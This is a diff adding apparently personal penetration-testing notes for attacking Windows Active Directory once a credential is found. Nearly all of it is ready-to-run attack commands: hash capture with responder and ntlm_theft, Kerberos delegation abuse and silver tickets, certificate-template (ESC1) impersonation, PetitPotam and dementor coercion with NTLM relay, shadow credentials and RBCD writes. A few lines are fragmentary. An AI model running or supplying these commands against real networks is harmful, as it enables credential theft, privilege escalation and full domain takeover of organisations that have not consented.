@@ -1,0 +1,100 @@
+You need to address these issues:
+- Differentiate information / commands on whether or additional permissions would return more information. 
+
+Focus on user sweep and don't dial in too much on netexec. Provide additional commands to run for additional information with your creds filled in. Split information / commands on whether or additional permissions would return more information.
+- Keep auth methods in mind per service per user, will know what to use next time
+- Automatically adjust /etc/hosts, krb5.conf, -> echo -n "$pass" | $user@$realm 
+
+Grab users via nxc:
+nxc smb $ip auth_method --users | awk '{print $5}' | tr -s -c ' ' >> users.txt 
+
+Run nxc authentication. If success -> User: svc1, svc2.. \n User Pwned: svc1.. -> perform relevant checks for authenticated services
+
+If x returned from y, then try z.
+
+What are the commands you're interested in whenever a new potential credential is discovered?
+
+--shares # Do i have access to additional shares?
+service -x whoami # can i execute commands now? Does Pwned mean that I can?
+smb -X whoami # can i execute commands now? Does Pwned mean that I can?
+
+# Can I grab a TGT? TGS?
+getTGT.py $dom/$user:$pass # -dc-ip $dc
+# Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the -impersonate flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account using the hashed password of user john and request a Service Ticket on its behalf for the www service on host server01.test.local.
+python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
+python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john
+
+# Do I have additional write (dacl) permissions?
+python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get writable --right WRITE --detail
+python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass get writable --detail
+
+python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123
+python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123
+
+# Can I perform targeted kerberoast?
+source /opt/targetedKerberoast/venv/bin/activate
+python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
+python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip -o kerberload.txt
+python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
+
+# Linux Kerberos
+"https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/#extract-accounts-from-etcsssdsssdconf"
+
+# Writable shares -> Capture Hash / RevShell
+# If writable, then ->
+nxc smb $ip auth_method --shares --filter-shares WRITE
+python /opt/ntlm_theft/ntlm_theft.py -g all -s $myip -f test
+sudo responder -I tun0 -d -w
+for f in $(ls test); do user[smb_auth_method]/$writable -c "put $f"
+windows_library_file.py windows_search_connectors.py
+netexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
+netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
+netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
+
+# Do I have new certificate vectors? 
+certipy-ad find -username $user@$dom -k -target $dc
+certipy-ad 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
+certipy-ad shadow auto -k -no-pass -u $dom/$user@$dc -dc-ip $ip -target $dc -account winrm_user
+python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'
+## Request a Certificate and add an alternative name (user to impersonate) 
+certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
+certipy-ad req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
+## Use OpenSSL and convert the certificate, do not enter a password 
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+## Move the cert.pfx to the target machine filesystem and request a TGT for the altname
+Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
+## https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
+
+
+# PetitPotam
+# A super cool technic by default on mecm when the database is separate of the site server is that the server site is necessary sysadmin of the database. We can use it to relay the MECM$ computer to the MSSQL server database.
+# Prereqs: mssql server, website server, smb, user, pass, 
+python3 sccmhunter.py mssql -u $user -p $pass -d $dom -dc-ip $dcip -debug -tu $user -sc P01 -stacked # database in MSSQL should be CM_{sc}
+ntlmrelayx.py -smb2support -ts -t mssql://$mssqlip -q "{command_provided_from_above}"
+python petitpotam.py -d $dom -u $user -p $pass $myip $siteip
+python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11 # Confirm now admin
+
+# Can I manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object ?
+for u in $(cat users.txt); do ...
+python pywhisker.py -d $dom -u $user -k  -t "winrm_user" --action "add"  --dc-ip $ip
+python /opt/pywhisker/pywhisker.py -d "$dom" -u "$user" -k --no-pass --dc-ip "$ip" -t $u --action list
+python3 pywhisker.py -d "test.local" -u "john" -p "password123" --target "user2" --action "list" --dc-ip "10.10.10.1"
+
+# Can I get a pk certificate? Can I get NTLM hash from it?
+python /opt/PKINITtools/gettgtpkinit.py $dom/winrm_user -cert-pfx XprBXoPu.pfx -pfx-pass SYBO85IL98n9g0vAfoWm winrm.ccache
+KRB5CCNAME=out.ccache python3 getnthash.py $dom/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
+
+# Does user have a spn? Do you have password? -> Silver Ticket
+ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain nagoya-industries.com -spn MSSQL/$dom -user-id 500 Administrator
+
+# Print Spooler enabled? -> Dementor
+dementor.py interacts with the printer spooler on a host to trigger an authentication from the target IP to an attacker controlled host (usually an SMB or HTTP server). This captured authentication can then be relayed to authenticated to other hosts. See more in ntlmrelayx.py.
+python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1
+
+# Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security descriptor of another computer. The following command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of DC01. This basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using getST.py.
+python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
+
+#gpp-passwords?
+#asrep?
+# Scrape 0xdf and HackTricks? https://swisskyrepo.github.io/InternalAllTheThings/active-directory? https://wadcoms.github.io/?
+
